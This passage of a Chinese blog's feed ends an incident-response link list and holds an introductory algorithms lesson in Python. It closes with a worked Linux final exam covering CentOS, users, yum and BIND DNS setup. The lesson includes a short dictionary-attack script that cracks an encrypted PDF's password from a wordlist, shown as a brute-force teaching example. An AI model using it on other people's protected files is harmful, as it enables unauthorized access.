href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org/">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com/">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="入侵排查篇" scheme="http://www.xiaocaibi.top/categories/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"/>
    
    
    <category term="入侵排查篇" scheme="http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"/>
    
  </entry>
  
  <entry>
    <title>算法入门系列课程1</title>
    <link href="http://www.xiaocaibi.top/posts/3086a710.html"/>
    <id>http://www.xiaocaibi.top/posts/3086a710.html</id>
    <published>2021-07-12T04:25:43.000Z</published>
    <updated>2021-09-20T08:47:43.869Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="算法入门系列课程1-周而复始"><a href="#算法入门系列课程1-周而复始" class="headerlink" title="算法入门系列课程1 - 周而复始"></a>算法入门系列课程1 - 周而复始</h2><h3 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h3><ol><li><p>什么是算法？</p><p>解决问题的正确方法和具体的实施步骤。</p><p>例子1：如何在两栋相距50m的大楼的两个房间牵一条线（两个房间都有窗）？</p><ul><li>养一只鸟（如鸽子），将线送过去</li><li>用很长的杆子将线递过去</li><li>用无人机（遥控飞行器）将线送过去</li></ul><p>如何评价这些方法的好坏？<strong>少花钱，不费事</strong>！</p><p>例子2：大教室里坐了几百名学生一起听课，如何快速的统计学生人数？</p><p>例子3：向列表容器中<strong>逆向</strong>插入100000个元素。</p><ul><li><p>方法1：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">nums = []for i in range(100000):    nums.append(i)nums.reverse()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>方法2：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">nums = []for i in range(100000):    nums.insert(0, i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p>例子3：生成Fibonacci数列（前100个Fibonacci数）。</p><ul><li><p>方法1 - 递推：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">a, b = 0, 1for num in range(1, 101):    a, b = b, a + b    print(f'{num}: {a}')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>方法2 - 递归：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def fib(num):    if num in (1, 2):        return 1    return fib(num - 1) + fib(num - 2)for num in range(1, 101):    print(f'{num}: {fib(num)}')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>方法3 - 改进的递归：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def fib(num, temp={}):    if num in (1, 2):        return 1    elif num not in temp:        temp[num] = fib(num - 1) + fib(num - 2)    return temp[num]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>方法4  - 改进的递归：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from functools import lru_cache@lru_cache()def fib(num):    if num in (1, 2):        return 1    return fib(num - 1) + fib(num - 2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>如何评价算法的好坏？</p><p><a href="https://zh.wikipedia.org/wiki/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6">渐近时间复杂度</a>和渐近空间复杂度。</p></li><li><p>大**<em>O**</em>符号的意义？</p><p>表示一个函数相对于输入规模的增长速度，也可以称之为函数的数量级。</p><table><thead><tr><th>大<em>O</em>符号</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>$$O(c)$$</td><td>常量时间复杂度</td><td>布隆过滤器 / 哈希存储</td></tr><tr><td>$$O(log_2n)$$</td><td>对数时间复杂度</td><td>二分查找（折半查找）</td></tr><tr><td>$$O(n)$$</td><td>线性时间复杂度</td><td>顺序查找 / 桶排序</td></tr><tr><td>$$O(n*log_2n)$$</td><td>对数线性时间复杂度</td><td>高级排序算法（归并排序、快速排序）</td></tr><tr><td>$$O(n^2)$$</td><td>平方时间复杂度</td><td>简单排序算法（选择排序、插入排序、冒泡排序）</td></tr><tr><td>$$O(n^3)$$</td><td>立方时间复杂度</td><td>Floyd算法 / 矩阵乘法运算</td></tr><tr><td>$$O(2^n)$$</td><td>几何级数时间复杂度</td><td>汉诺塔</td></tr><tr><td>$$O(n!)$$</td><td>阶乘时间复杂度</td><td>旅行经销商问题</td></tr></tbody></table></li></ol><h3 id="穷举法"><a href="#穷举法" class="headerlink" title="穷举法"></a>穷举法</h3><p>在计算机科学中，<strong>穷举法</strong>或者<strong>暴力搜索法</strong>是一个非常非常直观的解决问题的方法，这种方法通过一项一项的列举解决方案所有可能的候选项以及检查每个候选项是否符合问题的描述，最终得到问题的解。</p><p>虽然暴力搜索很容易实现，并且如果解决方案存在它就一定能够找到，但是它的代价是和候选方案的数量成比例的，由于这一点，在很多实际问题中，消耗的代价会随着问题规模的增加而快速地增长。因此，当问题规模有限或当存在可用于将候选解决方案的集合减少到可管理大小时，就可以使用暴力搜索。另外，当实现方法的简单度比速度更重要的时候，也可以考虑使用这种方法。</p><h3 id="经典例子"><a href="#经典例子" class="headerlink" title="经典例子"></a>经典例子</h3><ol><li><p><strong>百钱百鸡</strong>问题：公鸡5元一只，母鸡3元一只，小鸡1元三只，用100元买一百只鸡，问公鸡、母鸡、小鸡各有多少只？</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">for x in range(21):    for y in range(34):        z = 100 - x - y        if z % 3 == 0 and 5 * x + 3 * y + z // 3 == 100:            print(x, y, z)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>五人分鱼</strong>问题：ABCDE五人在某天夜里合伙捕鱼，最后疲惫不堪各自睡觉。第二天A第一个醒来，他将鱼分为5份，扔掉多余的1条，拿走了属于自己的一份；B第二个醒来，也将鱼分为5份，扔掉多余的1条，拿走属于自己的一份；然后C、D、E依次醒来，也按同样的方式分鱼，问他们至少捕了多少条鱼？</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">fish = 6while True:    total = fish    enough = True    for _ in range(5):        if (total - 1) % 5 == 0:            total = (total - 1) // 5 * 4        else:            enough = False            break    if enough:        print(fish)        break    fish += 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>暴力破解口令</strong>：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import reimport PyPDF2with open('Python_Tricks_encrypted.pdf', 'rb') as pdf_file_stream:    reader = PyPDF2.PdfFileReader(pdf_file_stream)    with open('dictionary.txt', 'r') as txt_file_stream:        file_iter = iter(lambda: txt_file_stream.readline(), '')        for word in file_iter:            word = re.sub(r'\s', '', word)            if reader.decrypt(word):                print(word)                break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://www.xiaocaibi.top/categories/python/"/>
    
    
    <category term="python" scheme="http://www.xiaocaibi.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>期末考试</title>
    <link href="http://www.xiaocaibi.top/posts/undefined.html"/>
    <id>http://www.xiaocaibi.top/posts/undefined.html</id>
    <published>2021-06-30T15:17:41.000Z</published>
    <updated>2021-07-01T00:46:52.312Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2020年-2021年第二学期"><a href="#2020年-2021年第二学期" class="headerlink" title="2020年-2021年第二学期"></a>2020年-2021年第二学期</h1><h2 id="Linux网络操作系统期末考试题"><a href="#Linux网络操作系统期末考试题" class="headerlink" title="Linux网络操作系统期末考试题"></a>Linux网络操作系统期末考试题</h2><p>总分（100分）<br>学号：<br>姓名：<br>班级专业：</p><ul><li>说明:本试卷为期末考试题,为电子试卷电子交卷,请将试卷名称命名为”学号+姓名.doc”,如学号20101101,姓名张三,则考卷命名为”20101101张三.doc”,请考生准确在试卷上填写个人信息,请按照一下题目要求完成,在需要截图的位置放置截图,考试卷中所有出现的均为班号后两位，均为学号的后三位如001，Z均为姓名的首字母拼音如zs。</li></ul><ul><li>新建一台centos7的虚拟机，参数如下：</li><li>虚拟机名：centos7server</li><li>硬盘大小：500G</li><li>内存大小：2048M</li><li>光驱：有，放入centos7.iso光盘</li><li>软驱：无</li><li>网卡地址：00-00-XX-XX-XY-</li><li>虚拟机的网络：NAT网络，关闭DHCP服务。</li><li>请在计算机中找到centos7.iso光盘的位置</li><li>截图要求（包含以上参数的虚拟机配置）</li></ul><ul><li><p>2、安装一台centos7的计算机，要求如下：（10分）<br>（1）硬盘分区：</p></li><li><p>/boot   xfs   200M</p></li><li><p>/   xfs   200G</p></li><li><p>Swap   swap   大小根据公式计算<br>截图要求（安装过程分区图）：</p></li><li><p>（2）安装要求：<br>安装包，全部默认安装图形桌面系统安装即可<br>截图要求（选择默认安装）：</p></li><li><p>（3）系统设置要求：</p></li><li><p>IP地址：192.168..</p></li><li><p>子网掩码:255.255.255.0</p></li><li><p>网关：192.168..254</p></li><li><p>DNS：192.168..</p></li><li><p>计算机名：serverZ.jsj.com</p></li><li><p>截图要求（网络配置）：</p></li><li><p>时区：东八区上海、使用UTC时间</p></li><li><p>截图要求（时间配置）：</p></li><li><p>（4）服务器首次配置<br>超级用户密码：redhat<br>时间配置：当日的时间<br>截图要求（时间配置）：</p></li><li><p>3、基本命令（5分）</p></li><li><p>（1）请用命令显示计算机名</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630175545.png"></p></li><li><p>（2）用命令显示计算机的IP地址</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630140018.png"></p></li><li><p>（3）用命令显示2016年1月的月历</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630140323.png"></p></li><li><p>（4）用命令显示当前用户的UID</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630140500.png"></p></li><li><p>（5）显示当前系统日期和时间。</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630175839.png"></p></li><li><p>截图要求（填写命令名称和参数并截图）：</p></li><li><p>4、系统的基本管理（15分）</p></li><li><p>（1）创建一个组ID为的用户组staff</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630190613.png"></p></li><li><p>（2）创建两个用户1和2</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630190726.png"></p></li><li><p>（3）修改两个用户的密码为RedHat123</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630191021.png"></p></li><li><p>（4）将1添加到staff组中</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630191237.png"></p></li><li><p>截图要求（查看/etc/passwd,/etc/group文件相关内容</p></li><li><p>（5）在1用户家目录下创建两个个文件夹web1，web2，在根目录下创建两个文件夹share1，share2</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630220454.png"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630221137.png"></p></li><li><p>（6）在web1中创建六个文件index1.html,index 2.html,index3.html和jsjnet1.txt,jsjnet2.txt,jsjnet3.txt</p></li><li><p>内容如下：</p></li><li><p>index1.html:  Welcome to Z Web1!!!</p></li><li><p>index2.html: Welcome to Z Web2!!!</p></li><li><p>index3.html: Welcome to Z Web3!!!</p></li><li><p>jsjnet1.txt: This is a text jsjnet1!</p></li><li><p>jsjnet2.txt: This is a text jsjnet2!</p></li><li><p>jsjnet3.txt: This is a text jsjnet3!</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630192352.png"></p></li><li><p>（7）将index1.html从原文件夹复制并更名为index1.html.bak</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630192556.png"></p></li><li><p>（8）将index1.html删除</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630192654.png"></p></li><li><p>（9）将index3.html重命名为index.html</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630215813.png"></p></li><li><p>(10) 将index2.html移动到web2文件夹，并命名为index.html</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630192959.png"></p></li><li><p>截图要求（cat分别查看文件内容，查看家目录，web1,web2文件夹内的内容）</p></li><li><p>（11）复制jsjnet1.txt,jsjnet2.txt到share1中</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630221520.png"></p></li><li><p>（12）移动jsjnet3.txt到share1中更名为testYXX3.txt</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630221955.png"></p></li><li><p>（13）用root账户移动share1到share2到目录下</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630222339.png"></p></li><li><p>截图要求（查看根目录，share1中的长文件内容）</p></li><li><p>(14)修改web2的属组为staff，属于的用户为2</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630223139.png"></p></li><li><p>(15)修改web1及其中的文件的属组和用户均为root</p></li><li><p>https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="<img src=""></p></li><li><p>(16)修改web1及其中的文件权限为u,g,o组均为读写可执行。</p></li><li><p>https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="<img src=""><br>（17）修改share1和share2的用户和属组为root</p></li><li><p>https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="<img src=""></p></li><li><p>(18)修改share2的权限为777</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630223627.png"></p></li><li><p>截图要求（用命令查看家目录、Web1和根目录的全部目录信息）：</p><h4 id="5、系统与服务的基本配置（60分）"><a href="#5、系统与服务的基本配置（60分）" class="headerlink" title="5、系统与服务的基本配置（60分）"></a>5、系统与服务的基本配置（60分）</h4></li><li><p>（1）网络基本配置 （5分）<br>修改系统网络为IP地址为192.X.XX.10   255.255.255.0   192.X.XX.254<br>DNS:192.X.XX.10，</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630223941.png"></p></li><li><p>请关闭系统防火墙，设置selinux为disabled。  vim /etc/selinux/config   将enforcing 改disabled</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630174637.png"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630175307.png"></p></li><li><p>修改计算机名为：serverZ.jsjnet.com</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630174159.png"></p></li><li><p>配置系统的Yum仓库为光盘：使用yum repolist进行检查</p></li><li><p>(1)创建一个挂载点</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/1.JPG"></p></li><li><p>进入</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629215610.png"></p></li><li><p>在yum.repos.d里面创建一个备份的文件夹</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630170528.png"></p></li><li><p>将里面所有repo的文件全部移动到backup文件夹</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630170658.png"></p></li><li><p>然后使用vim cdrom.repo配置挂载点</p><pre class="line-numbers language-none"><code class="language-none">[cdrom]name=isobaseurl=file:///mnt/cdromenabled=1gpgche=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630170917.png">）</p></li><li><p>然后使用motun 挂载</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630171131.png"></p></li><li><p>挂载完后,我们装一个vim 测试一下是否配置成功</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630171445.png"></p></li><li><p>这样就配置完了<br>截图要求（适当截取命令或配置文件均可）：</p></li><li><p>（2）磁盘管理（5分）<br>请为操作系统添加一块硬盘</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630224637.png"><br>将硬盘分为 /dev/sdb1，2G，格式化为ext4分区，开机自动挂载到/opt/data目录下<br>截图要求（适当截取命令或配置文件均可）：</p></li><li><p>1.使用fdisk -l 查看刚才添加的硬盘</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630225106.png"></p></li><li><p>2.然后在这里可以看到这是我们刚才添加的5g硬盘</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630225315.png"></p></li><li><p>3.我们使用.fdisk /dev/sdb </p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630225619.png"></p></li><li><p>4.这里输入n,输入p,w</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630230228.png"></p></li><li><p>5.然后我们对硬盘进行格式化</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630230533.png"></p></li><li><p>6.创建一个挂载点</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630230738.png"></p></li><li><ol start="7"><li>进入vim /etc/fstab对硬盘设置开机自动挂载</li></ol></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630231135.png"></p></li><li><ol start="8"><li>使用df -hT查看</li></ol></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630231348.png"></p></li><li><p>（3）DNS （10分）</p></li><li><p>1）安装DNS服务器</p></li><li><p>2）配置DNS服务器，<br>在本机配置一个DNS域为jsjnet.com，完成Z.jsnet.com，web1.jsjnet.com，web2.jsjnet.com，ftp.jsjnet.com，bbs.jsjnet.com五个域名的正反向解析，解析Ip全部为本机IP。<br>截图要求：截取DNS主文件配置内容，DNS辅助配置文件的内容，通过nslookup，dig或Ping测试所有的域名结果</p></li><li><p>dns配置:</p></li><li><p>安装dns服务</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629220426.png"></p></li><li><p>启动named服务</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629220809.png"></p></li><li><p>查看dns服务器是否开启</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629220943.png"></p></li><li><p>开启dns服务,重新加载防火墙配置</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629221157.png"></p></li><li><p>进入 vim /etc/named.conf主配置文件</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629221450.png"></p></li><li><p>将这两个改成any,开放53端口,允许所有人访问</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629221649.png"></p></li><li><p>配置完然后保存退出</p></li><li><p>然后进入区域配置文件vim /etc/named.rfc1912.zoens</p><pre class="line-numbers language-none"><code class="language-none">zone "localhost" IN {       type master;      file "named.localhost";      allow-update { none; };};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>正向解析:<br>将这段复制下来,5yy复制,然后GG跳到最后一行,按p粘贴,然后配置正向解析</p><pre class="line-numbers language-none"><code class="language-none">zone "jsjnet.com" IN {        type master;       file "jsjnet.com.zoen";       allow-update { none; }; };<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>反向解析:</p><pre class="line-numbers language-none"><code class="language-none">zone "0.in-addr.arpa" IN {        type master;        file "named.empty";        allow-update { none; };};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将这段复制下来,5yy复制,然后GG跳到最后一行,按p粘贴,然后配置反向解析</p></li></ul><pre class="line-numbers language-none"><code class="language-none">zone "8.168.192.in-addr.arpa" IN {        type master;        file "jsjnet.com.loopback";        allow-update { none; };};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>进入cd /var/named</p></li><li><p>cp -p named.localhost jsjnet.com.zoen                     复制一份改成jsjnet.com.zoen  </p></li><li><p>cp -p named.loopback jsjnet.com.loopback          复制一份jsjnet.com.loopback  </p></li><li><p>然后进入正向区域配置文件添加指针vim jsjnet.com.zoen<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629224522.png"></p></li><li><p>然后进入反向区域配置文件添加指针vim jsjnet.com.loopback</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210629225007.png"></p></li><li><p>然后重新加载</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630172907.png"></p></li><li><p>测试</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210630173215.png"></p></li><li><p>（4）Web 